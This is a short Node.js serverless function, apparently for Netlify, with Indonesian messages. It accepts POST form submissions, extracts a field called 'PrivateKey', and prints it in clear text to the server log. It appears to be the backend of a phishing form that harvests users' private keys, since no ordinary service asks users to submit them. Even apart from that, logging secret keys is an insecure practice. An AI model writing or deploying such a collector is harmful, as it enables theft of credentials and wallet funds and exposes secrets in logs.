const querystring = require('querystring');

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Metode ini hanya menerima POST',
    };
  }

  // Parsing body dengan querystring (untuk data form-urlencoded)
  const formData = querystring.parse(event.body);

  const PrivateKey = formData.PrivateKey;

  if (!PrivateKey) {
    return {
      statusCode: 400,
      body: 'Private Key tidak ditemukan!',
    };
  }

  // Simpan atau proses PrivateKey
  console.log(`Private Key diterima: ${PrivateKey}`);

  return {
    statusCode: 200,
    body: 'Form berhasil dikirim!',
  };
};
